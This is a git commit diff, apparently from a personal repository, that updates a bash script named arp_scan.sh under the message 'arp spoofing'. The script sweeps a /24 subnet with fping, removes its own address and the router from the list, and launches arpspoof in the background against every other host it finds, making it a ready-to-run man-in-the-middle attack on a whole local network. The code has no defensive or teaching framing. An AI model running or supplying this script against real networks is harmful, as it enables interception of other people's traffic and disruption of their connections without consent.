5f0fa9bc3f2281a931a690dc69f8542728bb25fa
r0man22 <roman.mammadov22@gmail.com>
2025-01-14 15:48:01 -0500

    arp spoofing

--- arp_scan.sh
+++ arp_scan.sh
@@ -1,8 +1,13 @@
 #!/bin/bash
 
 result=$(sudo fping -a -g 192.168.1.0/24 2>/dev/null)
-echo "$result"
+
+my_ip=$(hostname -I | awk '{print $1}')
+
+router_ip="192.168.1.1"
+
+result=$(grep -v -e "$my_ip" -e "$router_ip" <<< "$result")
 
 for ip in $result; do
-    sudo arpspoof -i eth0 -t 192.168.1.1 "$ip" $
+    sudo arpspoof -i eth0 -t 192.168.1.1 "$ip" &
 done
